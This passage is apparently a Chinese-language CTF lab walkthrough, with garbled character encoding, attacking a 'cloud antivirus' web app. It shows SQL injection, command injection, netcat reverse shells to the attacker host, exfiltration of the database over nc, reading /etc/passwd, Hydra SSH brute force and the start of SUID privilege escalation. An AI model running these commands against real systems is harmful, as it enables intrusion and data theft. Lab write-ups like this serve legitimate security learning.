src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104651517.png" alt="image-20211009104651517"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104834953.png" alt="image-20211009104834953"></p><p>å¯¹é¡µé¢è¿›è¡Œæµ‹è¯•åï¼Œ<strong>é€šè¿‡é•¿åº¦åˆ¤æ–­</strong>ï¼Œå‘ç°è¾“å…¥åŒå¼•å·(â€œ)å¯èƒ½äº§ç”Ÿäº†é—­åˆï¼Œæ”¹å˜åŸè¯­å¥æ‰§è¡Œè¯­ä¹‰ï¼Œå¯¼è‡´æŠ¥é”™ï¼ŒæŠ¥é”™é¡µé¢å¦‚ä¸‹å›¾ï¼Œ<strong>åˆ¤æ–­å­˜åœ¨æ³¨å…¥æ¼æ´</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105012567.png" alt="image-20211009105012567"></p><p>å‘ç°æŠ¥é”™é¡µé¢å­˜åœ¨<strong>ç–‘ä¼¼æŸ¥è¯¢è¯­å¥</strong></p><p>â€˜select * from code where password&#x3D;â€â€˜ + password + â€˜â€œâ€˜</p><p>çœå»å•å¼•å·</p><p>select * from code where password&#x3D;â€ + password + â€œ</p><p>å°è¯•é€šè¿‡æ­¤è¯­å¥æ„é€ payload</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105106411.png" alt="image-20211009105106411"></p><p>è¾“å…¥**1â€ or 1&#x3D;1â€“+**æäº¤åæˆåŠŸåˆ©ç”¨æ³¨å…¥æ¼æ´è·¨è¿‡äº†â€œinvite codeâ€éªŒè¯ï¼Œè¿›å…¥â€œäº‘é˜²ç—…æ¯’å¹³å°â€é¡µé¢</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105148438.png" alt="image-20211009105148438"></p><h3 id="3-å‘½ä»¤æ³¨å…¥"><a href="#3-å‘½ä»¤æ³¨å…¥" class="headerlink" title="3.å‘½ä»¤æ³¨å…¥"></a>3.å‘½ä»¤æ³¨å…¥</h3><p>å¯ä»¥å‘ç°è¿™ä¸ªé¡µé¢çš„æ‰€æ˜¾ç¤ºçš„ä¿¡æ¯æ˜¯ls -lå‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œåœ¨ç»“åˆé¡µé¢ä¸‹çš„â€File Nameâ€æ–‡æœ¬æ¡† å’Œâ€Scan!â€æäº¤æŒ‰é’®ï¼Œå¯ä»¥è”æƒ³åˆ°é¡µé¢èƒŒåçš„åŠŸèƒ½å®ç°è¿‡ç¨‹å¤§æ¦‚æ˜¯ä¸€ä¸ªâ€œç—…æ¯’æ”»å‡»&#x2F;å¹³å°â€å¯¹æ–‡ä»¶æ‰«æçš„åŠŸèƒ½ï¼Œä»£ç é€»è¾‘å¯èƒ½ç±»ä¼¼å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxScanner æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ˜¯å¦å¯ä»¥äº§ç”Ÿä½¿ç”¨<strong>ç®¡é“ç¬¦ï¼ˆ|ï¼‰</strong>è¿æ¥æ‰§è¡Œå…¶ä»–å‘½ä»¤å‘¢ï¼Ÿä¸‹é¢è¿›è¡Œå°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009142912228.png" alt="image-20211009142912228"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009142744487.png" alt="image-20211009142744487"></p><p>åœ¨ç­‰å¾…æœåŠ¡ç«¯å“åº”åï¼Œç¡®å®æ‰§è¡Œäº†lså’Œidï¼Œå¹¶åœ¨é¡µé¢è¿”å›äº†ç›¸åº”çš„ç»“æœï¼Œå³<strong>å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´</strong>ï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥åå¼¹shellï¼Ÿ</p><p>æ€è·¯1ï¼šç»“åˆå…ˆå‰æ‰«æç»“æœï¼Œå¯ä»¥å¾—åˆ°ç›®æ ‡ç³»ç»Ÿçš„è¯­è¨€ç¯å¢ƒæ˜¯Python2.7.15ï¼Œæ•…å¯ä»¥åˆ©ç”¨Pythonåå¼¹shell</p><p>æ€è·¯2ï¼šåˆ©ç”¨ncåå¼¹shell</p><p>(ä¸ºäº†å­¦ä¹ æ›´å¤šçš„æ”»å‡»æ–¹æ³•ï¼Œé€‰ç”¨æ€è·¯2)</p><h3 id="4-ä½¿ç”¨ncå»ºç«‹è¿æ¥"><a href="#4-ä½¿ç”¨ncå»ºç«‹è¿æ¥" class="headerlink" title="4.ä½¿ç”¨ncå»ºç«‹è¿æ¥"></a>4.ä½¿ç”¨ncå»ºç«‹è¿æ¥</h3><p>ç¡®è®¤ç›®æ ‡ç³»ç»Ÿ<strong>æ˜¯å¦å­˜åœ¨nc</strong>å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | which nc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143025187.png" alt="image-20211009143025187"></p><p>è¡¥å……ï¼š**| è¡¨ç¤ºç®¡é“ç¬¦ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°**</p><p>ç›®æ ‡ç³»ç»Ÿ<strong>å­˜åœ¨nc</strong>å‘½ä»¤ï¼Œå¯æ­£å¸¸è¿›è¡Œåç»­æ“ä½œ</p><p>åœ¨Kaliç«¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143140893.png" alt="image-20211009143140893"></p><p>ç¡®è®¤Kaliåœ°å€ä¸º10.0.2.4</p><p>ncç›‘å¬ç«¯å£4444</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143219519.png" alt="image-20211009143219519"></p><p>åœ¨æµè§ˆå™¨ç«¯ï¼š</p><p>ä½¿ç”¨ncåå¼¹è¿æ¥kaliç«¯çš„ç›‘å¬ï¼Œåœ¨å®éªŒ-eå‚æ•°æ‰§è¡Œä¸€ä¸ªshellç»ˆç«¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 4444 -e /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143635524.png" alt="image-20211009143635524"></p><p>æ‰§è¡Œåï¼Œå¹¶æ²¡æœ‰ç›‘å¬ç«¯å£æˆåŠŸè¿æ¥ï¼Œæ€€ç–‘è¯¥ç³»ç»Ÿçš„ç³»ç»Ÿç‰ˆæœ¬ä¸‹çš„nc<strong>ä¸æ”¯æŒ-eå‚æ•°</strong>ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å…ˆå»é™¤-eå‚æ•°ï¼Œå°è¯•è¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 4444 </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211011150457393.png" alt="image-20211011150457393"></p><p>æˆåŠŸå»ºç«‹è¿æ¥ï¼Œå°è¯•è¾“å…¥å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145019507.png" alt="image-20211009145019507"></p><p>ç»“æœå‘ç°ä¸èƒ½æ‰§è¡Œæ¥è¿”å›ç»“æœ</p><p>æ•…<strong>é‡‡ç”¨å¤šä¸ª</strong>ç®¡é“ç¬¦ï¼ˆ|ï¼‰ï¼Œæ­¤æ³•æš‚ä¸”ç§°ä¸ºâ€œ<strong>ncç®¡é“ç¬¦ä¸²è”</strong>â€</p><p>åœ¨Kaliä¸ŠåŒæ—¶ç›‘å¬5555å’Œ6666ç«¯å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145202343.png" alt="image-20211009145202343"></p><p>åœ¨æµè§ˆå™¨ç«¯ é‡‡ç”¨â€œncç®¡é“ç¬¦ä¸²è”â€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 5555 | /bin/bash | nc 10.0.2.4 6666 </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145552070.png" alt="image-20211009145552070"></p><p>kaliç«¯æ˜¾ç¤ºä¸¤ä¸ªç«¯å£éƒ½æˆåŠŸè¿æ¥</p><h3 id="5-ä¿¡æ¯æ”¶é›†-x2F-sshçˆ†ç ´"><a href="#5-ä¿¡æ¯æ”¶é›†-x2F-sshçˆ†ç ´" class="headerlink" title="5.ä¿¡æ¯æ”¶é›†&#x2F;sshçˆ†ç ´"></a>5.ä¿¡æ¯æ”¶é›†&#x2F;sshçˆ†ç ´</h3><p>å°è¯•åœ¨5555ç«¯å£ç›‘å¬çª—å£è¾“å…¥å‘½ä»¤ï¼Œå‘ç°æ‰§è¡Œç»“æœä¼šåœ¨6666ç«¯å£ç›‘å¬çª—å£æ˜¾ç¤ºï¼ŒæˆåŠŸ</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145754300.png" alt="image-20211009145754300"></p><p>ç™»å½•åˆ°ç›®æ ‡ç³»ç»Ÿåï¼ŒæŸ¥çœ‹æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151033812.png" alt="image-20211009151033812"></p><p>æŸ¥çœ‹app.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151112767.png" alt="image-20211009151112767"></p><blockquote><p>from flask import Flask, render_template, request, session<br>import sqlite3<br>import subprocess<br>import os</p><p>conn &#x3D; sqlite3.connect(â€˜database.sqlâ€™,check_same_thread &#x3D; False)<br>c &#x3D; conn.cursor()</p><p>app &#x3D; Flask(<strong>name</strong>)</p><p>@app.route(â€˜&#x2F;â€˜)<br>def index():<br>   return render_template(â€˜index.htmlâ€™)</p><p>@app.route(â€˜&#x2F;loginâ€™, methods&#x3D;[â€˜POSTâ€™])<br>def login():<br>   password &#x3D; request.form[â€˜passwordâ€™]<br>   if len(c.execute(â€˜select * from code where password&#x3D;â€â€˜ + password + â€˜â€œâ€˜).fetchall()) &gt; 0:<br>       session[â€˜logged_inâ€™] &#x3D; True<br>       return â€˜Redirecting to &#x2F;scan. <meta http-equiv="refresh" content="0; url=/scan" />â€˜<br>   else:<br>       return â€œWRONG INFORMATIONâ€</p><p>@app.route(â€˜&#x2F;scanâ€™)<br>def shop():<br>   if session.get(â€˜logged_inâ€™):<br>       filelist &#x3D; subprocess.Popen(â€œls -l &#x2F;home&#x2F;scanner&#x2F;cloudav_app&#x2F;samplesâ€, shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE).stdout.read()<br>       return render_template(â€˜scan.htmlâ€™,filelist&#x3D;filelist)<br>   else:<br>       return â€˜<meta http-equiv="refresh" content="0; url=/" />â€˜</p><p>@app.route(â€˜&#x2F;outputâ€™, methods&#x3D;[â€˜POSTâ€™])<br>def output():<br>   if session.get(â€˜logged_inâ€™):<br>       filename &#x3D; request.form[â€˜filenameâ€™]<br>       scan_results &#x3D; subprocess.Popen(â€œclamscan â€œ+filename, shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE).stdout.read()<br>       return â€œ<pre>" + scan_results + "</pre>â€œ<br>   else:<br>       return â€˜<meta http-equiv="refresh" content="0; url=/" />â€˜</p><p>if <strong>name</strong> &#x3D;&#x3D; â€œ<strong>main</strong>â€œ:<br>   app.secret_key &#x3D; os.urandom(12)<br>   app.run(host&#x3D;â€™0.0.0.0â€™,port&#x3D;8080, debug&#x3D;True)</p></blockquote><p>app.pyä¸­å¹¶æ²¡æœ‰å¯ä»¥ç›´æ¥æœ‰å…³ææƒçš„ä¿¡æ¯</p><p>æŸ¥çœ‹database.sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file database.sql</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151631066.png" alt="image-20211009151631066"></p><p>å‘ç°æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯SQLite 3.xï¼Œå†ç»“åˆä¹‹å‰sqlæ³¨å…¥æ—¶çš„é¡µé¢è¿”å›ä¿¡æ¯</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152025908.png" alt="image-20211009152025908"></p><p>ç‰ˆæœ¬ä¿¡æ¯ä¸€è‡´ï¼ŒçŒœæµ‹æ˜¯Webåº”ç”¨ç¨‹åºæœåŠ¡ç«¯çš„æ•°æ®åº“ï¼Œæœ‰å¯èƒ½æœ‰éšç§æ•°æ®ï¼Œæ‰€ä»¥å°±æœ‰å¿…è¦æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite</span><br></pre></td></tr></table></figure><p>å°è¯•æ‰§è¡Œå‘ç°æ²¡æœ‰ç›¸å…³æŒ‡ä»¤</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151902078.png" alt="image-20211009151902078"></p><p>å³<strong>æœåŠ¡ç«¯æ— æ³•è§£æ</strong>sqliteæ–‡ä»¶ï¼Œé‚£æ˜¯å¦å¯ä»¥å°†ä¸‹è½½åˆ°kaliæœ¬æœºä¸Šï¼Œä½¿ç”¨kaliæœ¬æœºä¸Šsqliteçš„æ‰§è¡Œç¯èŠ‚æ¥æŸ¥çœ‹æ–‡ä»¶database.sql</p><p>åœ¨Kaliç«¯æ–°çª—å£å¼€å¯ncç›‘å¬7777ç«¯å£ï¼Œå°†æ¥æ”¶åˆ°çš„æ‰€æœ‰<strong>è¿æ¥è¯·æ±‚éƒ½è½¬å‘åˆ°</strong>db.sqlæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777 &gt; db.sql</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152136352.png" alt="image-20211009152136352"></p><p>åœ¨ç›‘å¬5555ç«¯å£çš„çª—å£å†…ï¼Œè¿æ¥10.0.2.4ï¼ˆkaliï¼‰çš„7777ç«¯å£<strong>å†é€šè¿‡é‡å®šå‘</strong>å°†database.sqlä¼ è¾“åˆ°ncé€šé“å†…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.2.4 7777 &lt; database.sql</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152503151.png" alt="image-20211009152503151"></p><p>database.sqlæ–‡ä»¶ä¸å¤§ï¼Œå¾ˆå¿«ä¼ è¾“å®ŒCtrl+Cç»“æŸ</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152617144.png" alt="image-20211009152617144"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152646495.png" alt="image-20211009152646495"></p><p>ä½¿ç”¨kaliçš„sqlite3ç¯å¢ƒä¸‹æŸ¥çœ‹db.sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.open db.sql</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.database</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.dump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152831159.png" alt="image-20211009152831159"></p><p>æ˜¾ç¤ºåªæœ‰ä¸€ä¸ªå­—æ®µpassword,ä¸‹æ–¹çš„INSERTè¯­å¥å‘æ•°æ®åº“æ·»åŠ äº†å‡ ä¸ªå¯†ç ï¼Œé‚£æ˜¯å¦å¯ä»¥ç™»å½•ç›®æ ‡ç³»ç»Ÿï¼Ÿå›æƒ³å‘ç°é˜¶æ®µç›®æ ‡ç³»ç»Ÿä¸Šå¼€å¯sshæœåŠ¡ï¼Œæ‰€ä»¥è¿›è¡Œå°è¯•ï¼Œç°åœ¨å¯»æ‰¾ç›®æ ‡ç³»ç»Ÿä¸Šçš„ç”¨æˆ·å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153106205.png" alt="image-20211009153106205"></p><p>passwdæ–‡ä»¶ä¸­æ•°æ®å¾ˆå¤šï¼Œéœ€è¦åšç­›é€‰è¿‡æ»¤</p><p>ç­›é€‰å¯ä»¥ç”¨<strong>shellæƒé™</strong>ç™»å½•ç³»ç»Ÿçš„è´¦å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153238876.png" alt="image-20211009153238876"></p><p>å°†ç”¨æˆ·åå’Œå¯†ç éƒ½åˆ†åˆ«ç”Ÿæˆå­—å…¸ å‡†å¤‡è¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi user.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153516608.png" alt="image-20211009153516608"></p><p><img src="/Week2.assets/image-20211009153446916.png" alt="image-20211009153446916"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153702323.png" alt="image-20211009153702323"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009153648892.png" alt="image-20211009153648892"></p><p>ä½¿ç”¨Hydraçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://10.0.2.7</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009154535990.png" alt="image-20211009154535990"></p><p>ç ´è§£å®Œæˆï¼Œå¤±æœ›ï¼Œæ²¡æœ‰æ­£ç¡®ç»“æœï¼Œè¿™ç§æ”»å‡»å¤±è´¥äº†ï¼Œå°è¯•åˆ«çš„æ”»å‡»æ‰‹æ®µ</p><h3 id="6-SUIDææƒ"><a href="#6-SUIDææƒ" class="headerlink" title="6.SUIDææƒ"></a>6.SUIDææƒ</h3><p>å›åˆ°ç›®æ ‡æœºç›®å½•ä¸‹ï¼Œå°è¯•æŸ¥çœ‹ç›®å½•ä¸‹åˆ«çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls samples</span><br></pre></td></tr></table></figure><p>å‘ç°è¿™äº›æ–‡ä»¶å°±æ˜¯Webç•Œé¢é‚£äº›å¯ä»¥è¿›è¡Œé˜²ç—…æ¯’æ‰«æçš„æ–‡ä»¶</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009160341754.png" alt="image-20211009160341754"></p><p>æš‚æ—¶æ²¡æœ‰å‘ç°æœ‰å¸®åŠ©çš„ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls templates</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009160512163.png" alt="image-20211009160512163"></p><p>çœ‹åˆ°templateä¸‹æœ‰ä¸¤ä¸ª<strong>Webå¼€å‘é¡µé¢æ¨¡æ¿æ–‡ä»¶</strong> index.html scan.htmlï¼Œä½†ä¹Ÿæ²¡æœ‰æœ‰å¸®åŠ©çš„ä¿¡æ¯</p><p>æŸ¥çœ‹æŸ¥çœ‹çš„ç›®å½•ï¼Œç¡®è®¤ç°åœ¨æ‰€åœ¨ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009164418370.png" alt="image-20211009164418370"></p><p>å»ä¸Šä¸€çº§ç›®å½•ï¼Œ&#x2F;home&#x2F;scanner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd .. </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la     #æŸ¥çœ‹éšè—æ–‡ä»¶</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls- l</span><br></pre></td></tr></table></figure><p>åœ¨éšè—æ–‡ä»¶ä¸­å¹¶æœªå‘ç°æœ‰ç›´æ¥å¸®åŠ©çš„æ–‡ä»¶ï¼Œä½†å‘ç°äº†.cæ–‡ä»¶</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165417380.png" alt="image-20211009165417380"></p><p>update_cloudav.cå¯èƒ½å°±æ˜¯cloudav.appç¨‹åºçš„Cè¯­è¨€æºä»£ç ï¼Œä¸”å¯ä»¥çœ‹åˆ°è¿™ä¸ªç¨‹åºçš„æƒé™æ˜¯<strong>å¯æ‰§è¡Œçš„</strong>ï¼Œsä¹Ÿä»£è¡¨æœ‰suidæƒé™ä½ï¼Œä¸”å±ä¸»æ˜¯rootè´¦å·ï¼Œå½“æ‰§è¡Œè¯¥ç¨‹åºæ—¶ä¼š<strong>é»˜è®¤ç»§æ‰¿è¯¥ç¨‹åºå±ä¸»çš„æƒé™</strong></p><p>è®¾æƒ³ï¼šå¦‚æœå¯ä»¥æ‰§è¡Œè¿™ä¸ªupdate_cloudav.cï¼Œæ˜¯å¦å¯ä»¥é€šè¿‡æŸç§å‘½ä»¤æ³¨å…¥çš„æ–¹æ³•ï¼Œ<strong>åˆ©ç”¨suidæƒé™</strong>å¸¦æ¥çš„rootæƒé™æ¥<strong>æ‰§è¡ŒæŸäº›ç³»ç»Ÿå‘½ä»¤æ¥åå¼¹shell</strong>ï¼Œæ¥<strong>å®Œæˆææƒ</strong>ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat update_cloudav.c</span><br></pre></td></tr></table></figure><blockquote><p>#include &lt;stdio.h&gt;</p><p>int main(int argc, char *argv[])<br>{<br>char *freshclam&#x3D;â€&#x2F;usr&#x2F;bin&#x2F;freshclamâ€;</p><p>if (argc &lt; 2){<br>printf(â€œThis tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\nâ€);<br>return 1;<br>}</p><p>char *command &#x3D; malloc(strlen(freshclam) + strlen(argv[1]) + 2);<br>sprintf(command, â€œ%s %sâ€, freshclam, argv[1]);<br>setgid(0);<br>setuid(0);<br>system(command);<br>return 0;</p><p>}</p></blockquote><p>åŒ…å«äº†ä¸€äº›<strong>å¤´æ–‡ä»¶</strong>ï¼Œå®šä¹‰äº†ä¸€äº›<strong>å˜é‡</strong>ï¼Œå˜é‡æŒ‡å‘äº†æ“ä½œç³»ç»Ÿä¸­çš„æ–‡ä»¶freshclamï¼Œfreshclamæ˜¯ç»™å¼€æºæ€æ¯’è½¯ä»¶cloudavçš„ç—…æ¯’åº“å‡çº§çš„è½¯ä»¶ã€‚è¿™ä¸ªç¨‹åº<strong>å®šä¹‰äº†ä¸€ä¸ªæ‰§è¡Œå‚æ•°</strong>ï¼Œå¦‚æœç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­<strong>ä¸åŒ…å«</strong>è¿™ä¸ªå‚æ•°çš„è¯å°±ä¼š<strong>æ˜¾ç¤ºä¿¡æ¯</strong>ï¼Œè¦æ±‚æäº¤ä¸€ä¸ªå‘½ä»¤è¡Œçš„å‚æ•°ï¼Œè¿™æ ·freshclamè¿™ä¸ªç¨‹åºæ‰èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå®Œæˆç—…æ¯’åº“çš„æ›´æ–°ã€‚å¦‚æœæ­£ç¡®ä½¿ç”¨å‚æ•°ï¼Œé‚£ä¹ˆå°±ä¼šæ­£å¸¸çš„è¿è¡Œcloudavï¼Œæ‰§è¡Œç—…æ¯’åº“çš„æ›´æ–°ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼šå½“æˆ‘ä»¬<strong>æ‰§è¡Œupdate_cloudav.cæ—¶</strong>ï¼Œä¼š<strong>è°ƒç”¨</strong>äº†cloudav.appçš„<strong>ç—…æ¯’æ›´æ–°ç¨‹åºfreshclam</strong>ï¼Œä½†åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­<strong>è¦æ±‚è¦æœ‰è¿è¡Œå‚æ•°ã€‚</strong></p><p>å…ˆæµ‹è¯•ä¸€ä¸ªå‚æ•°a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165635210.png" alt="image-20211009165635210"></p><p>å‡ºç°æ—¥å¿—æ–‡ä»¶<strong>æŠ¥é”™</strong>ï¼Œä½†æ˜¯ä¸ç¡®å®šæ˜¯å¦ä¼šå¯¹æ‰§è¡Œæœ‰å½±å“ï¼Œç»§ç»­å°è¯•</p><p>åˆ©ç”¨ç®¡é“ç¬¦ä¸²è”</p><p>åœ¨kaliç«¯: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 8888</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165823593.png" 